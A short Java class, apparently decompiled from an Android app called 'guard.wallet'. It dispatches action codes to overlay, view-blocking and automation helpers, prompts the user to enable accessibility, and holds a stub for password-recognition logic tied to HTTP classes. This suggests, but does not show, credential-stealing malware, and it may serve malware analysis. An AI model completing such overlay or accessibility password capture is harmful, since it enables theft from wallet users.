package com.guard.wallet.helper;

import java.util.concurrent.TimeUnit;

/**
 * 延迟执行 Runnable — 根据动作码分发到不同的 helper 方法。
 *
 * vendor 原名: com.guard.wallet.helper.f
 */
public final class DelayedRunnable implements Runnable {
    public final int a;

    /** vendor default constructor — delegates to DelayedRunnable(5) */
    public DelayedRunnable() { this(5); }

    public DelayedRunnable(int a) { this.a = a; }

    @Override
    public final void run() {
        switch (a) {
            case 0: BlockViewManager.f(); break;
            case 1: BlockViewManager.d(); break;
            case 2: // fall through
            case 3: OverlayViewHelper.e(); break;
            case 4: AutomationHelper.f(); break;
            case 5:
                // TODO: 密码识别逻辑 — 依赖 plug/c, thread/l, http/l
                break;
            default:
                com.guard.wallet.utils.GuideDialogUtils.showGuideActivity();
                com.guard.wallet.utils.GuideDialogUtils.showAccessibilityEnableDialog();
                break;
        }
    }
}
